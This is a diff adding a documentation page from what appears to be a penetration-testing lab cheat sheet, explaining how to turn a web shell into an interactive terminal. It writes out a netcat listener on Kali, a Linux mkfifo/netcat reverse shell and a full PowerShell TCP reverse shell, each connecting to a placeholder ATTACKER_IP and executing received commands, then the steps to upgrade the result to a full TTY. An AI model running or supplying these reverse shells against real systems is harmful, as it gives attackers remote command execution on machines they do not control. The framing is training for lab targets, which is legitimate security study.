@@ -1,0 +1,86 @@
+---
+title: "Web shell → terminal"
+sidebarTitle: "Web shell → terminal"
+description: "Run a listener on Kali, connect back from the web shell, then upgrade the terminal using the matching OS path. Linux PTY steps apply only to Linux; the Windows PowerShell reverse shell is a basic command channel. For a usable Windows remoting session, use Evil-WinRM when you have credentials and WinRM access."
+keywords: ["web shell", "webshell", "web shell to terminal", "bad web shell", "unresponsive shell", "full tty", "interactive shell"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/web-shell-to-terminal.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Replace UPPER_CASE values with your lab values.
+
+## 1. Kali — listen
+
+**Kali**
+
+```bash
+sudo nc -lvnp 443
+```
+
+Use the Kali/VPN IP that the target can reach; keep this terminal open.
+
+## 2a. Linux web shell — connect back
+
+**Linux web-shell command field**
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 443 > /tmp/f
+```
+
+Replace &lt;ATTACKER_IP>. When the connection arrives on Kali, follow the Full TTY upgrade below.
+
+## 2b. Windows web shell — connect back
+
+**Windows web-shell command field (cmd.exe)**
+
+```text
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+Choose 2a OR 2b. A waiting web request can be normal while the shell is connected; check the Kali listener before submitting again.
+
+## 3. Linux target — start a PTY
+
+**New Linux shell in Kali**
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Then press Ctrl-Z to return to your local Kali prompt.
+
+## 4. Kali — restore the connection in raw mode
+
+**Local Kali terminal**
+
+```bash
+stty size
+stty raw -echo; fg
+```
+
+Remember the rows/columns from stty size. Press Enter once or twice after fg.
+
+## 5. Linux target — finish TTY setup
+
+**Remote Linux shell**
+
+```bash
+export TERM=xterm
+export SHELL=/bin/bash
+stty rows ROWS columns COLUMNS
+```
+
+Replace ROWS and COLUMNS with the numbers from Kali. If your local terminal is broken after disconnecting, run stty sane; reset on Kali.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=web%20shell)
+
+## Learning and original examples
+
+- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+- [Windows → Kali reverse shell](/commands/windows-reverse-shell)
+- [Upgrade a Linux shell](/commands/shell-upgrade)
+- [Evil-WinRM](/commands/evil-winrm)
